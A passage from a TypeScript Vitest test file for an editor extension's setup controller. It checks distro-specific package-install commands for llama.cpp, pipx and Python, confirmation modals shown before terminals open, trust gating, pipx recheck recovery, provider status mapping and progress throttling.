    const { host, controller } = makeController(); // default OS_FEDORA_44
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([{ name: 'llama.cpp install', command: 'sudo dnf install llama-cpp' }]);
  });

  it('arch: the pacman line is used — NEVER the dnf line', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_ARCH }) });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([
      { name: 'llama.cpp install', command: 'sudo pacman -S --needed llama-cpp' },
    ]);
  });

  it('opensuse tumbleweed: the zypper line is used — NEVER the dnf line', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_TUMBLEWEED }) });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([{ name: 'llama.cpp install', command: 'sudo zypper install llamacpp' }]);
  });

  it('debian (no engine entry): refused fail-closed — guidance only, modal never shown, NEVER the dnf line', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_DEBIAN_13 }) });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).not.toContain('dnf');
    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
    expect(host.terminalsCreated).toEqual([]);
  });

  it('unknown family (unrecognized os-release): refused fail-closed — NEVER the dnf line', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: '' }) });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).not.toContain('dnf');
    expect(host.terminalsCreated).toEqual([]);
  });

  it('containerMismatch: refused with the §6 container note as the reason — NEVER the dnf line', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    expect(result).toEqual({ ok: false, reason: CONTAINER_NOTE_COPY });
    expect(host.terminalsCreated).toEqual([]);
  });

  it('SECURITY sweep: across every non-fedora fixture, the outcome command/reason never contains "dnf"', async () => {
    const nonFedoraFixtures: { name: string; read: { text?: string; containerMismatch?: boolean } }[] = [
      { name: 'arch', read: { text: OS_ARCH } },
      { name: 'suse', read: { text: OS_TUMBLEWEED } },
      { name: 'debian', read: { text: OS_DEBIAN_13 } },
      { name: 'ubuntu 24.04', read: { text: OS_UBUNTU_2404 } },
      { name: 'unknown', read: { text: '' } },
      { name: 'container', read: { containerMismatch: true } },
    ];
    for (const fixture of nonFedoraFixtures) {
      const { host, controller } = makeController({}, { readOsRelease: async () => fixture.read });
      const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
      const producedCommand = host.terminalsCreated[0]?.command ?? '';
      expect(producedCommand, fixture.name).not.toContain('dnf');
      if (!result.ok) expect(result.reason, fixture.name).not.toContain('dnf');
    }
  });

  it('modal names the exact engine command BEFORE creating the terminal (fedora)', async () => {
    const { host, controller } = makeController();
    await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
    expect(modalCall).toContain('sudo dnf install llama-cpp');
    expect(host.calls.indexOf(modalCall as string)).toBeLessThan(
      host.calls.findIndex((c) => c.startsWith('createTerminal:')),
    );
  });
});

// --- T6: vllm's docs-only recipe stays refused by the existing guided-terminal guard ---

describe('T6: setup.openInstallTerminal(vllm) — docs-only recipe refused, no engine read, no modal', () => {
  it("refused: 'docs-only' is not 'guided-terminal' — no modal, no terminal, OS engine never consulted", async () => {
    let osReads = 0;
    const { host, controller } = makeController(
      {},
      {
        readOsRelease: async () => {
          osReads++;
          return { text: OS_FEDORA_44 };
        },
      },
    );
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'vllm' });
    expect(result.ok).toBe(false);
    expect(host.terminalsCreated).toEqual([]);
    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
    expect(osReads).toBe(0);
  });
});

// --- T6: status() projects vllm's docs-only recipe onto the wire (R-1a) -----

describe('T6: projectBackend — vllm carries docsUrl + localInstall.flavor === "docs-only" (R-1a)', () => {
  it('status() projects a wire-visible docsUrl for the docs-only vllm entry', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    const vllm = data.fim.options.find((o) => o.id === 'vllm');
    expect(vllm?.localInstall?.flavor).toBe('docs-only');
    expect(vllm?.docsUrl).toBe('https://docs.vllm.ai/');
  });
});

// --- setup.openBootstrapTerminal (T11 IMPORTANT host-gap 2) ------------------

describe('setup.openBootstrapTerminal: Tier-1 modal -> createTerminal("Install pipx", "sudo dnf install pipx") pre-typed', () => {
  it('accept -> creates a terminal with the exact pre-typed pipx bootstrap command', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openBootstrapTerminal', {});
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
  });

  it('shows a modal naming the exact command BEFORE creating the terminal', async () => {
    const { host, controller } = makeController();
    await controller.handle('setup.openBootstrapTerminal', {});
    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
    expect(modalCall).toBeDefined();
    expect(modalCall).toContain('sudo dnf install pipx');
    // Modal happens before the terminal is created (write-order proof, same
    // discipline as `setup.openInstallTerminal`/`setup.applyFim`).
    expect(host.calls.indexOf(modalCall as string)).toBeLessThan(
      host.calls.findIndex((c) => c.startsWith('createTerminal:')),
    );
  });
});

// --- setup.reload (T11 IMPORTANT host-gap 1) ---------------------------------

describe('setup.reload: trust-gated (FM-14), modal-free, calls host.reload() directly', () => {
  it('trusted: calls host.reload() with no modal', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.reload', {});
    expect(result).toEqual({ ok: true });
    expect(host.reloadCalls).toBe(1);
    expect(host.calls).toEqual(['reload']); // no showModal: entry anywhere
  });

  it('untrusted: refused, host.reload() never called (also covered by the FM-14 table above)', async () => {
    const { host, controller } = makeController({ trusted: false });
    const result = await controller.handle('setup.reload', {});
    expect(result.ok).toBe(false);
    expect(host.reloadCalls).toBe(0);
  });
});

// --- FIX 1 (final review wave, IMPORTANT): setup.recheck re-probes pipx -----

describe('setup.recheck re-probes pipx (FIX 1: the pipx-missing/python-unsuitable recovery dead-end)', () => {
  it('a cached pipx-missing clears after a successful recheck-triggered relocate — Install becomes actionable again', async () => {
    let calls = 0;
    const { controller } = makeController(
      {},
      {
        locatePipx: async (): Promise<PipxLocateResult> => {
          calls++;
          return calls === 1
            ? { ok: false, reason: 'pipx-missing', detail: 'no pipx on PATH' }
            : OK_PIPX_LOCATE;
        },
      },
    );

    // Drive the install into the sticky pipx-missing state (locatePipx call #1).
    const installResult = await controller.handle('setup.install', { backendId: 'hermes' });
    // T5 C-17: reason is the §6 sentence; the PHASE (sticky issue) keeps the enum.
    expect(installResult).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
    expect((await controller.status()).agent.phase).toBe('pipx-missing');

    // Without a recheck, status() alone never re-probes (this is the bug: it
    // would stay 'pipx-missing' forever). setup.recheck re-runs locatePipx
    // (call #2, now ok) and CLEARS the sticky issue.
    const recheckResult = await controller.handle('setup.recheck', {});
    expect(recheckResult).toEqual({ ok: true });
    expect(calls).toBe(2);

    const data = await controller.status();
    expect(data.agent.phase).toBe('missing'); // Install button is back
  });

  it('python-unsuitable -> recheck -> still unsuitable refreshes the detail honestly instead of staying stale', async () => {
    const { controller } = makeController(
      {},
      {
        locatePipx: async (): Promise<PipxLocateResult> => ({
          ok: false,
          reason: 'python-unsuitable',
          detail: 'no suitable python (>=3.11, <3.14) found',
        }),
      },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    expect((await controller.status()).agent.phase).toBe('python-unsuitable');

    const recheckResult = await controller.handle('setup.recheck', {});
    expect(recheckResult).toEqual({ ok: true });

    const data = await controller.status();
    expect(data.agent.phase).toBe('python-unsuitable');
    expect(data.agent.detail).toContain('no suitable python');
  });

  it('pipx-missing can flip to python-unsuitable across recheck attempts (refreshed, not merely confirmed)', async () => {
    let calls = 0;
    const { controller } = makeController(
      {},
      {
        locatePipx: async (): Promise<PipxLocateResult> => {
          calls++;
          return calls === 1
            ? { ok: false, reason: 'pipx-missing', detail: 'no pipx' }
            : { ok: false, reason: 'python-unsuitable', detail: 'pipx found, python too old' };
        },
      },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    expect((await controller.status()).agent.phase).toBe('pipx-missing');

    await controller.handle('setup.recheck', {});
    expect((await controller.status()).agent.phase).toBe('python-unsuitable');
  });

  // T11 (§3, critic C-8): a probe-timeout is honest-but-not-fatal — the
  // AgentSetupPhase carries 'error' (there is no dedicated phase enum member
  // for it), and the §6 copy is surfaced verbatim as the detail line.
  it('T11: setup.install maps locatePipx {reason:"probe-timeout"} -> {phase:"error", detail: §6 copy}', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: async (): Promise<PipxLocateResult> => ({ ok: false, reason: 'probe-timeout', detail: PROBE_TIMEOUT_COPY }) },
    );

    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe(PROBE_TIMEOUT_COPY);

    const data = await controller.status();
    expect(data.agent.phase).toBe('error');
    expect(data.agent.detail).toBe(PROBE_TIMEOUT_COPY);
  });

  it('T11: setup.recheck maps locatePipx {reason:"probe-timeout"} -> {phase:"error", detail: §6 copy}', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: async (): Promise<PipxLocateResult> => ({ ok: false, reason: 'probe-timeout', detail: PROBE_TIMEOUT_COPY }) },
    );

    const result = await controller.handle('setup.recheck', {});
    expect(result).toEqual({ ok: true });

    const data = await controller.status();
    expect(data.agent.phase).toBe('error');
    expect(data.agent.detail).toBe(PROBE_TIMEOUT_COPY);
  });

  it('T11: setup.install passes its AbortController.signal into locatePipx (Cancel reachability, critic C-11)', async () => {
    let receivedSignal: AbortSignal | undefined;
    const { controller } = makeController(
      {},
      {
        locatePipx: async (signal?: AbortSignal): Promise<PipxLocateResult> => {
          receivedSignal = signal;
          return OK_PIPX_LOCATE;
        },
      },
    );

    await controller.handle('setup.install', { backendId: 'hermes' });
    expect(receivedSignal).toBeInstanceOf(AbortSignal);
    expect(receivedSignal?.aborted).toBe(false);
  });

  it('T4 M-2 carry-forward: a REJECTING locatePipx during recheck never becomes an unhandled rejection', async () => {
    const { controller } = makeController(
      {},
      {
        locatePipx: async () => {
          throw new Error('pipx vanished mid-flow');
        },
      },
    );
    const result = await controller.handle('setup.recheck', {});
    expect(result).toEqual({ ok: true });
    const data = await controller.status();
    expect(data.agent.phase).toBe('error');
    expect(data.agent.detail).toContain('pipx vanished');
  });

  it('a successful recheck with no prior issue is a harmless no-op (still missing, not mis-flagged)', async () => {
    const { controller } = makeController();
    const result = await controller.handle('setup.recheck', {});
    expect(result).toEqual({ ok: true });
    expect((await controller.status()).agent.phase).toBe('missing');
  });
});

// --- FIX 3 (final review wave): MUTATING_METHODS exhaustiveness lock --------

describe('MUTATING_METHODS / READ_ONLY_METHODS partition the full SetupMethod union (FIX 3)', () => {
  // A `Record<SetupMethod, true>` literal: TypeScript refuses to compile
  // this object if a new value is ever added to the `SetupMethod` union
  // without a matching key here — a compile-time backstop layered on top of
  // the runtime Set-equality assertion below. Adding the key here is NOT
  // enough on its own, though: the runtime assertion is what actually fails
  // if that new method isn't ALSO placed into MUTATING_METHODS or
  // READ_ONLY_METHODS — i.e. classified, not just acknowledged.
  const ALL_SETUP_METHODS_MAP: Record<SetupMethod, true> = {
    'setup.status': true,
    'setup.install': true,
    'setup.applyAgent': true,
    'setup.applyFim': true,
    'setup.setApiKey': true,
    'setup.testRemote': true,
    'setup.pullModel': true,
    'setup.provisionModel': true,
    'setup.saveAgentModel': true,
    'setup.cancel': true,
    'setup.openProviderWizard': true,
    'setup.openInstallTerminal': true,
    'setup.openBootstrapTerminal': true,
    'setup.recheck': true,
    'setup.reload': true,
    'setup.setNextEdit': true,
    'setup.setRag': true,
    'setup.setTunable': true,
  };
  const ALL_SETUP_METHODS = Object.keys(ALL_SETUP_METHODS_MAP) as SetupMethod[];

  it('every SetupMethod appears in exactly one of MUTATING_METHODS / READ_ONLY_METHODS', () => {
    const combined = [...MUTATING_METHODS, ...READ_ONLY_METHODS];
    // No duplicates across the two sets (a method classified as BOTH would
    // pass the "union covers everything" check below without this).
    expect(new Set(combined).size).toBe(combined.length);
    expect([...combined].sort()).toEqual([...ALL_SETUP_METHODS].sort());
  });
});

// --- FIX 4 (final review wave, T13 M-1): null-guard on malformed authMethods -

describe('computeProviderCard null-guard (FIX 4): a malformed (null) advertised-method entry is dropped, not thrown', () => {
  it('a null entry mixed with a valid managed method is dropped; the valid one still resolves configured', async () => {
    // Deliberately malformed input (a null array element) — proves
    // computeProviderCard's `m?.id` guard drops it instead of throwing on
    // `m.id` off a null `m`. The dep's declared type can't forbid this at
    // compile time; only the runtime guard can.
    const malformed: unknown[] = [null, { id: 'openrouter', name: 'openrouter creds' }];
    const { controller } = makeController(
      {},
      { getAdvertisedAuthMethods: () => malformed as { id: string; name: string }[] },
    );
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'configured', providerId: 'openrouter' });
  });

  it('an array of ONLY malformed entries resolves unconfigured, never throws', async () => {
    const malformed: unknown[] = [null, undefined];
    const { controller } = makeController(
      {},
      { getAdvertisedAuthMethods: () => malformed as { id: string; name: string }[] },
    );
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'unconfigured' });
  });
});

// --- status() assembly --------------------------------------------------------

// --- beta.6 T8 (CC-10): additive restoration settings on the wire -----------

describe('status(): nextEdit.dedicatedBackendId / rag.embedBackend restoration (beta.6 T8)', () => {
  it('rag.embedBackend defaults to "ollama" and is ALWAYS populated when never set', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.rag.embedBackend).toBe('ollama');
  });

  it('rag.embedBackend reflects a saved value', async () => {
    const { controller } = makeController({ settings: settingsMap({ 'talaria.rag.embedBackend': 'openai-compat' }) });
    const data = await controller.status();
    expect(data.rag.embedBackend).toBe('openai-compat');
  });

  it('a corrupted rag.embedBackend degrades to the "ollama" default, never propagates garbage', async () => {
    const { controller } = makeController({ settings: settingsMap({ 'talaria.rag.embedBackend': 'not-a-backend' }) });
    const data = await controller.status();
    expect(data.rag.embedBackend).toBe('ollama');
  });

  it('nextEdit.dedicatedBackendId is ABSENT from the wire when never set', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.nextEdit.dedicatedBackendId).toBeUndefined();
  });

  it('nextEdit.dedicatedBackendId reflects a saved value', async () => {
    const { controller } = makeController({
      settings: settingsMap({ 'talaria.nextEdit.dedicatedBackendId': 'vllm' }),
    });
    const data = await controller.status();
    expect(data.nextEdit.dedicatedBackendId).toBe('vllm');
  });

  it('a corrupted nextEdit.dedicatedBackendId is OMITTED, never propagates garbage', async () => {
    const { controller } = makeController({
      settings: settingsMap({ 'talaria.nextEdit.dedicatedBackendId': 'bogus-pane' }),
    });
    const data = await controller.status();
    expect(data.nextEdit.dedicatedBackendId).toBeUndefined();
  });
});

describe('status(): assembles SetupData from registry + settings + secrets + ollama probe', () => {
  it('defaults: agent missing, fim ollama, rag defaults, ollama not running', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.agent.phase).toBe('missing');
    expect(data.fim.selectedId).toBe('ollama');
    expect(data.fim.model).toBe('qwen2.5-coder:1.5b-base');
    expect(data.rag.embedModel).toBe('qwen3-embedding:0.6b');
    expect(data.ollama.running).toBe(false);
    expect(data.ready).toBe(false);
  });

  it('hermesPath set + backend=mock -> installed-inactive', async () => {
    const { controller } = makeController({
      settings: settingsMap({ 'talaria.hermesPath': '/x/bin/hermes', 'talaria.backend': 'mock' }),
    });
    const data = await controller.status();
    expect(data.agent.phase).toBe('installed-inactive');
  });

  it('hermesPath set + backend=acp but NO advertised authMethods yet -> agent ready, provider waiting-agent, ready:false', async () => {
    // Task 13 update: the provider card is now driven SOLELY by the
    // ACP-advertised authMethods (dep seam) — settings saying "acp" no longer
    // flips it off 'waiting-agent'; only a real initialize result does.
    const { controller } = makeController({
      settings: settingsMap({ 'talaria.hermesPath': '/x/bin/hermes', 'talaria.backend': 'acp' }),
    });
    const data = await controller.status();
    expect(data.agent.phase).toBe('ready');
    expect(data.provider.phase).toBe('waiting-agent');
    expect(data.ready).toBe(false);
  });

  it('after a successful install, phase is awaiting-reload (not ready) until a reload actually happens', async () => {
    const { controller } = makeController();
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.phase).toBe('awaiting-reload');
  });

  it('ollama running populates ollama.models and embedModelPresent', async () => {
    const { controller } = makeController(
      {},
      {
        probeOllama: async () => ({
          running: true,
          models: [{ name: 'qwen3-embedding:0.6b', sizeBytes: 123 }],
        }),
      },
    );
    const data = await controller.status();
    expect(data.ollama.running).toBe(true);
    expect(data.rag.embedModelPresent).toBe(true);
  });

  it('nextEdit.source=generic on a backend without generic support carries a refusalDetail', async () => {
    const { controller } = makeController(
      { settings: settingsMap({ 'talaria.autocomplete.backend': 'codestral' }) },
      { getNextEditSource: () => 'generic' },
    );
    const data = await controller.status();
    expect(data.nextEdit.refusalDetail).toBeDefined();
  });
});

// --- Task 13: provider card from the ACP-advertised authMethods (§2.1) -------

describe('Task 13: provider card mapped from the advertised authMethods', () => {
  const SETUP_ONLY = [{ id: 'hermes-setup', name: 'Configure Hermes provider' }];
  const PROVIDER_AND_SETUP = [
    { id: 'openrouter', name: 'openrouter runtime credentials' },
    { id: 'hermes-setup', name: 'Configure Hermes provider' },
  ];

  it('dep returns undefined (no initialize yet / mock backend) -> waiting-agent, no providerId', async () => {
    const { controller } = makeController({}, { getAdvertisedAuthMethods: () => undefined });
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'waiting-agent' });
  });

  it('ONLY hermes-setup advertised -> unconfigured (the wizard is the way forward), no providerId', async () => {
    const { controller } = makeController({}, { getAdvertisedAuthMethods: () => SETUP_ONLY });
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'unconfigured' });
  });

  it('an agent-managed method (id != hermes-setup) -> configured, providerId = that id', async () => {
    const { controller } = makeController({}, { getAdvertisedAuthMethods: () => PROVIDER_AND_SETUP });
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'configured', providerId: 'openrouter' });
  });

  it('an EMPTY advertisement (agent answered, zero methods) -> unconfigured, never a fabricated configured', async () => {
    const { controller } = makeController({}, { getAdvertisedAuthMethods: () => [] });
    const data = await controller.status();
    expect(data.provider).toEqual({ phase: 'unconfigured' });
  });

  it('agent ready + provider configured + FIM green -> ready:true', async () => {
    const { controller } = makeController(
      { settings: settingsMap({ 'talaria.hermesPath': '/x/bin/hermes', 'talaria.backend': 'acp' }) },
      { getAdvertisedAuthMethods: () => PROVIDER_AND_SETUP },
    );
    const data = await controller.status();
    expect(data.agent.phase).toBe('ready');
    expect(data.provider).toEqual({ phase: 'configured', providerId: 'openrouter' });
    expect(data.ready).toBe(true);
  });

  it('provider configured but the agent NOT ready keeps the composite ready:false (never provider-only ready)', async () => {
    const { controller } = makeController({}, { getAdvertisedAuthMethods: () => PROVIDER_AND_SETUP });
    const data = await controller.status();
    expect(data.agent.phase).toBe('missing');
    expect(data.provider.phase).toBe('configured');
    expect(data.ready).toBe(false);
  });

  // --- FIX 5 (final review wave, T9 M4): read-path write removed --------------
  // `status()` used to write `globalState['talaria.setup.completed']=true` on
  // every read where `ready` was true — a WRITE on a READ path with zero
  // readers anywhere in `src` (confirmed by grep). Deleted outright rather
  // than fixed in place; this proves `status()` no longer touches
  // globalState at all, on either a ready or not-ready computation.
  it('status() never writes globalState, ready or not (T9 M4: dead read-path write removed)', async () => {
    const { host, controller } = makeController(
      { settings: settingsMap({ 'talaria.hermesPath': '/x/bin/hermes', 'talaria.backend': 'acp' }) },
      { getAdvertisedAuthMethods: () => PROVIDER_AND_SETUP },
    );
    const before = host.calls.length;
    const data = await controller.status();
    expect(data.ready).toBe(true);
    expect(host.calls.slice(before).some((c) => c.startsWith('globalState:'))).toBe(false);
    expect(host.globalStateStore.has('talaria.setup.completed')).toBe(false);
  });
});

// --- onProgress: throttled >=150ms via a real timer --------------------------

describe('onProgress: throttled >=150ms per (op, id) via a real timer', () => {
  beforeEach(() => {
    vi.useFakeTimers();
  });
  afterEach(() => {
    vi.useRealTimers();
  });

  it('emits the first event immediately, coalesces a rapid burst into one delayed final emission', async () => {
    const { controller } = makeController();
    const received: SetupProgress[] = [];
    controller.onProgress((p) => received.push(p));

    // Drive three rapid 'log' events through the private pushProgress path by
    // installing (which streams phase/log/done events from the fake engine).
    // First event of an install should land synchronously (elapsed=Infinity).
    const installPromise = controller.handle('setup.install', { backendId: 'hermes' });

    // The fake installHermes fires its onEvent calls synchronously inside its
    // own async function body — by the time the modal (auto-accepted) and the
    // locatePipx/installHermes awaits settle, several progress events will
    // have been pushed within the same tick window.
    await vi.runAllTimersAsync();
    await installPromise;

    expect(received.length).toBeGreaterThan(0);
    // The very first pushed event was emitted with zero delay.
    expect(received[0]?.op).toBe('install');
  });

  it('two pushes for the same (op,id) inside the throttle window collapse into one timer-delivered value', () => {
    const { controller } = makeController();
    const received: SetupProgress[] = [];
    controller.onProgress((p) => received.push(p));

    const push = (controller as unknown as { pushProgress(p: SetupProgress): void }).pushProgress.bind(controller);
    push({ op: 'pull', id: 'model-x', phase: 'a' });
    expect(received).toEqual([{ op: 'pull', id: 'model-x', phase: 'a' }]);

    push({ op: 'pull', id: 'model-x', phase: 'b' });
    push({ op: 'pull', id: 'model-x', phase: 'c' });
    // Still throttled — no second emission yet.
    expect(received.length).toBe(1);

    vi.advanceTimersByTime(149);
    expect(received.length).toBe(1);

    vi.advanceTimersByTime(2);
    // Only the LATEST pending value ('c') was delivered, not 'b'.
    expect(received).toEqual([
      { op: 'pull', id: 'model-x', phase: 'a' },
      { op: 'pull', id: 'model-x', phase: 'c' },
    ]);
  });
});

// --- helper ------------------------------------------------------------------

function settingsMap(entries: Record<string, unknown>): Map<string, unknown> {
  return new Map(Object.entries(entries));
}

/** T5 helper: drive the controller into the sticky `pipx-missing` /
 *  `python-unsuitable` phase by running an install whose locatePipx fails
 *  with that reason (the ONLY way the phase arises — see computeAgentPhase). */
function failingLocate(reason: 'pipx-missing' | 'python-unsuitable', detail: string) {
  return async (): Promise<PipxLocateResult> => ({ ok: false, reason, detail });
}

// --- T5 §1.2: status() populates SetupData.os from the engine ----------------

describe('T5: status() populates SetupData.os per family (engine-composed, memoized)', () => {
  const FAMILY_TABLE: { name: string; text: string; family: string; manager: string; prettyName: string }[] = [
    { name: 'fedora 44', text: OS_FEDORA_44, family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' },
    { name: 'ubuntu 24.04', text: OS_UBUNTU_2404, family: 'debian', manager: 'apt-get', prettyName: 'Ubuntu 24.04 LTS' },
    { name: 'debian 13', text: OS_DEBIAN_13, family: 'debian', manager: 'apt-get', prettyName: 'Debian GNU/Linux 13 (trixie)' },
    { name: 'arch', text: OS_ARCH, family: 'arch', manager: 'pacman', prettyName: 'Arch Linux' },
    { name: 'opensuse tumbleweed', text: OS_TUMBLEWEED, family: 'suse', manager: 'zypper', prettyName: 'openSUSE Tumbleweed' },
  ];

  for (const row of FAMILY_TABLE) {
    it(`${row.name} -> os { family: ${row.family}, manager: ${row.manager}, prettyName }`, async () => {
      const { controller } = makeController({}, { readOsRelease: async () => ({ text: row.text }) });
      const data = await controller.status();
      expect(data.os).toEqual({ family: row.family, manager: row.manager, prettyName: row.prettyName });
    });
  }

  it('unreadable os-release ({} from the binding, e.g. win32) -> family unknown, manager unknown, NO containerNote', async () => {
    const { controller } = makeController({}, { readOsRelease: async () => ({}) });
    const data = await controller.status();
    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
  });

  it('containerMismatch -> family unknown + the §6 container note VERBATIM (S-F10 honesty)', async () => {
    const { controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
    const data = await controller.status();
    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown', containerNote: CONTAINER_NOTE_COPY });
  });

  it('a REJECTING readOsRelease degrades to unknown instead of failing status()', async () => {
    const { controller } = makeController(
      {},
      {
        readOsRelease: async () => {
          throw new Error('EACCES');
        },
      },
    );
    const data = await controller.status();
    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
  });

  it('memoized: two status() calls read os-release ONCE', async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.status();
    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1);
  });

  it('setup.recheck re-reads: a distro change (or container escape) is picked up', async () => {
    let reads = 0;
    const { controller } = makeController(
      {},
      {
        readOsRelease: async () => {
          reads++;
          return reads === 1 ? { containerMismatch: true } : { text: OS_FEDORA_44 };
        },
      },
    );
    expect((await controller.status()).os?.family).toBe('unknown');
    await controller.handle('setup.recheck', {});
    const data = await controller.status();
    expect(reads).toBe(2);
    expect(data.os).toEqual({ family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' });
  });
});

// --- T5 §1.2: agent.bootstrap / agent.pythonInstall per phase ----------------

describe('T5: agent.bootstrap present iff phase === pipx-missing (engine-composed)', () => {
  it('fedora: bootstrap carries the exact engine command + §6 known-distro guidance', async () => {
    const { controller } = makeController({}, { locatePipx: failingLocate('pipx-missing', 'no pipx') });
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.phase).toBe('pipx-missing');
    expect(data.agent.bootstrap).toEqual({ command: 'sudo dnf install pipx', guidance: PIPX_MISSING_KNOWN_COPY });
  });

  it('arch: bootstrap.command is the pacman line (per-family, never hardcoded dnf)', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({ text: OS_ARCH }) },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.bootstrap).toEqual({
      command: 'sudo pacman -S --needed python-pipx',
      guidance: PIPX_MISSING_KNOWN_COPY,
    });
  });

  it('unknown distro: bootstrap has NO command, §6 unknown-distro guidance', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.bootstrap).toEqual({ guidance: PIPX_MISSING_UNKNOWN_COPY });
  });

  it('absent for every non-pipx-missing phase (missing here)', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.agent.phase).toBe('missing');
    expect(data.agent.bootstrap).toBeUndefined();
    expect(data.agent.pythonInstall).toBeUndefined();
  });
});

describe('T5: agent.pythonInstall present iff phase === python-unsuitable (engine plan)', () => {
  it('fedora: a command plan (sudo dnf install python3.13)', async () => {
    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', 'python too old') });
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.phase).toBe('python-unsuitable');
    expect(data.agent.pythonInstall?.kind).toBe('command');
    expect(data.agent.pythonInstall).toMatchObject({ command: 'sudo dnf install python3.13' });
  });

  it('ubuntu 22.04: the versioned universe command plan', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.pythonInstall).toMatchObject({
      kind: 'command',
      command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv',
    });
  });

  it('ubuntu 26.04 (the rev-3 case): a GUIDANCE plan, never a command', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });
    const data = await controller.status();
    expect(data.agent.pythonInstall?.kind).toBe('guidance');
  });
});

// --- T5 §1.2: setup.openBootstrapTerminal — server-side command resolution ---

describe('T5: setup.openBootstrapTerminal resolves the command server-side from the engine ONLY', () => {
  it('fedora, no target (defaults to pipx): modal names the EXACT command + sourceNote verbatim, then pre-types it', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openBootstrapTerminal', {});
    expect(result).toEqual({ ok: true });
    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
    expect(modalCall).toContain('sudo dnf install pipx');
    expect(modalCall).toContain(
      "Fedora's official repository via dnf — the distro's signed archive, the system's root of trust (packages.fedoraproject.org).",
    );
    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
  });

  it('arch: the pacman line is pre-typed (per-family, PIPX_BOOTSTRAP_COMMAND is gone)', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_ARCH }) });
    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'pipx' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo pacman -S --needed python-pipx' }]);
  });

  it("target:'python' on fedora: pre-types the python install command, modal names command + sourceNote", async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
    expect(result).toEqual({ ok: true });
